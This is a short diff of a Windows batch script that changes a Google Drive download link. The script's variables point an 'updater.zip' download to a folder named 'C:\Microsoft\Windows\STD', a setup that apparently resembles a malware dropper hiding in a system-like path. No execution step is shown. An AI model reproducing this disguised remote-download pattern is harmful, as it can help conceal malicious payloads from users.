@@ -1,6 +1,6 @@
 @echo off
 REM Define variables
-set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=16PiWOebDW8dB9QIj5NqYoaHNSK4P1Z66&export=download&authuser=1&confirm=t&uuid=483b7a43-b7a9-498c-9e66-7491b0780419&at=APvzH3rcwbBpX_BhQ3sNiN7y0jFD%3A1733418863043"
+set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1Bh1exDobyf9t5ggNVzxjqmdKENGICiSl&export=download&authuser=0&confirm=t&uuid=4a8d85de-ccc9-4963-902a-26f04e8be41f&at=APvzH3q6euntBHx13f2cyS49tcvy%3A1733766185547"
 set "destinationFolder=C:\Microsoft\Windows\STD"
 set "downloadedFileName=updater.zip"
 set "extractionFolder=%destinationFolder%\UpdaterFiles"
